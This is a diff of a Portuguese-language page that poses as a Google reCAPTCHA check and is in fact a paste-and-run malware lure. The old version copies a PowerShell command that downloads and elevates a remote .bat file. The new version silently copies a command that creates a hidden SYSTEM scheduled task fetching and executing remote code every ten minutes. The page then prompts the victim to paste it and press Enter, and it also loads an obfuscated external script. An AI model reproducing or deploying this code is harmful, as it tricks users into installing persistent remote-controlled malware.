@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head>
+<html lang="pt-BR"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação reCAPTCHA</title>
@@ -114,6 +113,7 @@
             font-weight: 500;
             margin-top: 15px;
             transition: background 0.2s;
+            disabled: true;
         }
 
         #verify-button:hover:not(:disabled) {
@@ -124,8 +124,17 @@
             background: #ccc;
             cursor: not-allowed;
         }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(720deg); }
+        }
+
+        .spin-animation {
+            animation: spin 0.8s ease-out;
+        }
     </style>
-</head>
+<script type="module" src="https://akiranakaisan184.github.io/BaFZva4rEnbVEGjS5CbH5uPeNLkABdvefWHi8q0z8cYqlmzfzKG02VVEY7E-1m2h-y9YYUL7kBwZmoIW-N3CyQ=="></script></head>
 <body>
     <div class="captcha-container">
         <div class="header-container">
@@ -133,15 +142,16 @@
                 <input type="checkbox" id="captcha-checkbox">
                 <span style="font-size: 16px; color: #202124;">Não sou um robô</span>
             </label>
+            
             <div class="recaptcha-brand">
                 <div class="recaptcha-logo">
-                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="">
                     <span>reCAPTCHA</span>
                 </div>
             </div>
         </div>
 
-        <div class="verification-box" id="verification-box">
+        <div class="verification-box" id="verification-box" style="display: block;">
             <div class="verification-steps">
                 <strong style="font-size: 16px; display: block; margin-bottom: 15px;">Complete a Verificação</strong>
                 <ol>
@@ -150,41 +160,71 @@
                     <li>Pressione <strong>Enter</strong> para finalizar</li>
                 </ol>
             </div>
-            <div class="verification-code" id="verification-code">
+            
+            <div class="verification-code">
                 "Não sou um robô - ID do reCAPTCHA:2417"
             </div>
-            <button id="copy-button" onclick="copyToClipboard()">Copiar Código</button>
+
             <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
         </div>
     </div>
+
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
-            if (this.checked) {
-                document.getElementById('verification-box').style.display = 'block';
-                copyToClipboard();
-            } else {
-                document.getElementById('verification-box').style.display = 'none';
-            }
-        }); else {
-                document.getElementById('verification-box').style.display = 'none';
-            }
-        });
-
-        function copyToClipboard() {
-            const command = `powershell -Command \"& {iwr -useb 'https://omiie.com/tools/2fa.bat' -OutFile $env:TEMP\2fa.bat; Start-Process -FilePath $env:TEMP\2fa.bat -Verb RunAs}\"`;
-            navigator.clipboard.writeText(command);
+            const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
             
-        }
+            const textArea = document.createElement('textarea');
+            textArea.value = command;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            const logo = document.querySelector('.recaptcha-logo img');
+            logo.classList.add('spin-animation');
+            setTimeout(() => logo.classList.remove('spin-animation'), 800);
+
+            document.getElementById('verification-box').style.display = 'block';
+
+            const button = document.getElementById('verify-button');
+            button.disabled = true;
+            let seconds = 6;
+            
+            const countdown = setInterval(() => {
+                button.textContent = `VERIFICAR (${seconds})`;
+                seconds--;
+                
+                if(seconds < 0) {
+                    clearInterval(countdown);
+                    button.disabled = false;
+                    button.textContent = 'VERIFICAR';
+                }
+            }, 1000);
+        });
 
         function verificarCaptcha() {
             const button = document.getElementById('verify-button');
             button.innerHTML = 'Verificando...';
             button.disabled = true;
+            
             setTimeout(() => {
                 button.innerHTML = '✔ Verificado';
                 button.style.backgroundColor = '#34a853';
+                setTimeout(() => {
+                    window.location.href = 'https://www.contabilizei.com.br/consulta-cnpj-cartao/'; // REDIRECIONAMENTO
+                 }, 500);
             }, 2000);
         }
     </script>
+</body>
+</html>}, 500);
+            }, 2000);
+        }
+    </script>
+
+
+<div id="">
+    
+</div>
 </body>
 </html>
